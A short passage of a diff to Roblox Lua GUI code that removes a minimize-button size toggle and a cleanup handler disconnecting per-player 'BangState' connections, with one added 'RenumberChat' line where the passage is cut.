-                MainFrame.Size = UDim2.new(MainFrame.Size.X.Scale, MainFrame.Size.X.Offset, 0, 40)
-                MinBtn.Text = "+"
-            else
-                MainFrame.Size = UDim2.new(MainFrame.Size.X.Scale, MainFrame.Size.X.Offset, 0, 350)
-                MinBtn.Text = "-"
-            end
-        end)
-
-        ScreenGui.Destroying:Connect(function()
-            for _, p in ipairs(Players:GetPlayers()) do
-                if BangState[p.Name] then
-                    if BangState[p.Name].Connection then BangState[p.Name].Connection:Disconnect() end
-                    BangState[p.Name] = nil
-                end
-            end
-        end)
-    end)
-end
+            RenumberChat
